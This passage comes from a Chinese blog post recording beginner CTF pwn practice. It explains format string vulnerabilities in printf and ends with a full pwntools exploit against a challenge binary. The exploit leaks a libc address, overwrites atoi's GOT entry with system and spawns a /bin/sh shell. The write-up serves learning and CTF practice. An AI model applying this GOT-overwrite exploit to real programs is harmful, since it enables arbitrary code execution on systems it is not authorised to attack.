+<p>既然本地不一定能做到，那就用现成的题目文件吧。</p>
+<p>下面我们用这个文件看一下利用格式化字符串漏洞读取数据的方法：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/23.jpg" alt="figure"><br>我们看到，第七个%x取值是0x41414141, 也就是AAAA的ascii码，造成内存泄漏了。<br>解释：该文件GET YOUR NAME:后， 执行的是printf(str)。<br>也就是说，它把我们的输入当格式化字符串执行了。<br>我们%x取的其实是寄存器中的内容，寄存器里面又存什么呢？<br>是printf除格式化字符串外的参数，但是这里没有输入参数，也就是说，寄存器的内容其实是垃圾值。</p>
+<p>那又为什么在第七个%x取值位置输出了AAAA呢？<br>因为调用printf后，首先再把格式化字符串压栈，再把参数地址存进寄存器和栈中，再把所有能用的寄存器压栈，最后存进了个格式化字符串指针（用来指向格式化字符串地址，检索格式符），我这个ubuntu linux内寄存器地址加空白地址一共六个四字节空间，第七个取到的就是格式化字符串中的AAAA了。<br>栈图(网上找的)如下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/23.png" alt="figure"><br>墨绿是寄存器地址，蓝色是空白位或者额外的存储参数空间，绿色是格式化字符串内容，橙色是格式化字符串指针。</p>
+<p>夸张的是，%x能泄露栈上高地址位的内容，%n的修改内存的功能，能将更改任意函数的调用。这两者结合简直无法无天。</p>
+<p>下面进入题目分析环节。。。：<br>IDA pro分析：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/24.jpg" alt="figure"><br>这道题了里，我们先利用%$7x(取第7个四字节数)， 返回puts函数链接后的地址。然后用%n改变atoi的调用，使它的调用地址指向system的函数地址（用偏移量算）,输入的age没经过类型检查，直接换成”/bin/sh”, 大功告成。<br>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwne'</span>)</span><br><span class="line"><span class="comment"># conn=remote('ip',port)</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('./libc.so.6')</span></span><br><span class="line">p = process(<span class="string">'./pwne'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'[Y/N]\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'NAME:\n\n'</span>)</span><br><span class="line">p.sendline(p32(elf.got[<span class="string">'puts'</span>]) + <span class="string">'%7$s'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'WELCOME \n'</span>)</span><br><span class="line">puts_addr=p.recv()[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line"><span class="comment"># print u32(put_addr)</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'puts'</span>] + u32(puts_addr)</span><br><span class="line">atoi_got_addr = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">p.sendline(<span class="string">'17'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'[Y/N]\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'NAME:\n\n'</span>)</span><br><span class="line">p.sendline(fmtstr_payload(<span class="number">7</span>, &#123;atoi_got_addr: system_addr&#125;))</span><br><span class="line">p.recvuntil(<span class="string">'GET YOUR AGE:\n\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>效果如下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/25.jpg" alt="figure"></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">shanah</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://TonyShanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/">http://TonyShanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">shanah</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/pwn/">
+                                    <span class="chip bg-color">pwn</span>
+                                </a>
+                            
+                                <a href="/tags/%E8%AE%B0%E5%BD%95/">
+                                    <span class="chip bg-color">记录</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="pwn实践记录--rop入门">
+                        
+                        <span class="card-title">pwn实践记录--rop入门</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            回过来记录入门历程主要是为了复习巩固pwn的分析思路。因为写的很详细，篇幅很长，未写完的会第二天写。全部内容包括：ret2shellcode、ret2libc(绕过NX)、ret2libc(绕过ASLR)、格式化字符串漏洞。若理解有错误，请
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            shanah
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                    <a href="/tags/%E8%AE%B0%E5%BD%95/">
+                        <span class="chip bg-color">记录</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/03/05/OWASP-Top-10-%E4%BB%8B%E7%BB%8D%E5%92%8C%E7%90%86%E8%A7%A3/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="OWASP Top 10  介绍和理解">
+                        
+                        <span class="card-title">OWASP Top 10  介绍和理解</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            大三下刚开学，打算网安实习，看到一些职位要求了解OWASP Top 10，打算在这里记录了解到的知识以及凭记忆和搜索引擎分析分析这些安全威胁产生的具体场景。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            shanah
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/owasp/">
+                        <span class="chip bg-color">owasp</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2020</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">shanah</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
